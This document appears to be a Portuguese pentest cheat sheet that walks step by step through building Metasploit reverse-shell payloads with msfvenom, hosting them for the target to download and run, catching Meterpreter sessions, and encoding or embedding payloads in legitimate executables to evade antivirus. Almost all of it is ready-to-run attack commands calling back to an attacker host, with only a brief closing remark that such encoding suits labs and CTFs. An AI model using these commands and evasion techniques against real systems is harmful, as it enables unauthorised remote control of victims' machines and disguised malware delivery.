## Exploração usando payload gerado com `msfvenom`

Objetivo:

1. Gerar payload
2. Entregar ao alvo
3. Abrir listener
4. Obter shell

Ferramentas:

- msfvenom
- Metasploit Framework

---

# Fase 1 — Gerar payload

Exemplo Windows:

msfvenom -p windows/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-f exe -o shell.exe

Resultado:

shell.exe

Esse arquivo conecta de volta ao atacante.

---

# Fase 2 — Iniciar listener

msfconsole  
use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LHOST 192.168.1.10  
set LPORT 4444  
run

Agora o handler fica aguardando conexão.

---

# Fase 3 — Entregar payload

Métodos comuns:

### HTTP server simples

python3 -m http.server 80

No alvo:

wget http://192.168.1.10/shell.exe

---

### SMB share

impacket-smbserver share .

---

### Upload via vulnerabilidade web

Exemplo:

- HTTP PUT
- File upload
- Webshell

---

# Fase 4 — Executar payload no alvo

Windows:

shell.exe

Linux:

chmod +x shell.elf  
./shell.elf

---

# Fase 5 — Conexão recebida

Metasploit mostra:

Meterpreter session 1 opened

---

# Fase 6 — Interagir com sessão

sessions  
sessions -i 1

---

# Comandos básicos meterpreter

getuid  
sysinfo  
shell  
pwd  
ls

---

# Fluxo completo

msfvenom → gerar payload  
        ↓  
host payload  
        ↓  
target baixa  
        ↓  
target executa  
        ↓  
reverse connection  
        ↓  
meterpreter session

---

# Exemplo completo (rápido)

### Atacante

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe  
python3 -m http.server 80

### Listener

msfconsole  
use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LHOST 192.168.1.10  
set LPORT 4444  
run

### Alvo

wget http://192.168.1.10/shell.exe  
shell.exe

---

# Variações comuns

|Cenário|Payload|
|---|---|
|Upload PHP|php/meterpreter/reverse_tcp|
|Linux RCE|linux/x64/meterpreter/reverse_tcp|
|Command injection|cmd/unix/reverse_bash|
|Windows upload|windows/x64/meterpreter/reverse_tcp|

---

# Classificação

|Etapa|Tipo|
|---|---|
|Gerar payload|Exploit preparation|
|Entrega|Initial access|
|Execução|Exploit|
|Meterpreter|Post-exploitation|
## Encoding com `msfvenom`

Encoding é usado para **ofuscar o payload** e reduzir detecção por antivírus básicos.  
Ferramenta: msfvenom

---

# Estrutura com encoder

msfvenom -p <payload> LHOST=<ip> LPORT=<porta> \  
-e <encoder> -i <iterações> -f <formato> -o <arquivo>

|Parâmetro|Função|
|---|---|
|-e|encoder|
|-i|número de vezes|
|-p|payload|
|-f|formato|

---

# 1. Encoder mais usado (Windows)

msfvenom -p windows/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-e x86/shikata_ga_nai \  
-i 5 \  
-f exe -o shell_encoded.exe

- `x86/shikata_ga_nai` → encoder polimórfico
- `-i 5` → aplica 5 vezes

---

# 2. Encoding para payload x64

msfvenom -p windows/x64/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-e x64/xor \  
-i 3 \  
-f exe -o shell_x64.exe

---

# 3. Encoding Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-e x86/shikata_ga_nai \  
-i 3 \  
-f elf -o shell.elf

---

# 4. Múltiplas iterações fortes

msfvenom -p windows/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-e x86/shikata_ga_nai \  
-i 10 \  
-f exe -o shell_strong.exe

Mais iterações:

- maior evasão
- maior tamanho

---

# 5. Listar encoders disponíveis

msfvenom -l encoders

Encoders comuns:

|Encoder|Arquitetura|
|---|---|
|x86/shikata_ga_nai|x86|
|x64/xor|x64|
|cmd/powershell_base64|PowerShell|
|generic/none|nenhum|

---

# 6. Encoding + bad chars

msfvenom -p windows/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-e x86/shikata_ga_nai \  
-i 5 \  
-b "\x00\x0a\x0d" \  
-f exe -o shell.exe

Remove caracteres problemáticos.

---

# 7. Encoding + template (mais evasão)

msfvenom -p windows/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-e x86/shikata_ga_nai \  
-i 5 \  
-x legit.exe \  
-f exe -o shell_packed.exe

Injeta em executável legítimo.

---

# Fluxo completo

payload → encoding → gerar exe  
                ↓  
host payload  
                ↓  
executar no alvo  
                ↓  
meterpreter session

---

# Exemplo completo

msfvenom -p windows/x64/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-e x64/xor \  
-i 5 \  
-f exe -o encoded.exe

Listener:

msfconsole  
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse_tcp  
set LHOST 192.168.1.10  
set LPORT 4444  
run

---

# Observação importante

Encoding:

- NÃO garante bypass AV moderno
- apenas ofuscação básica
- útil em labs e CTFs

---

# Classificação

|Uso|Tipo|
|---|---|
|Encoding|Evasion|
|msfvenom|Exploit support|
|payload encoded|Initial access|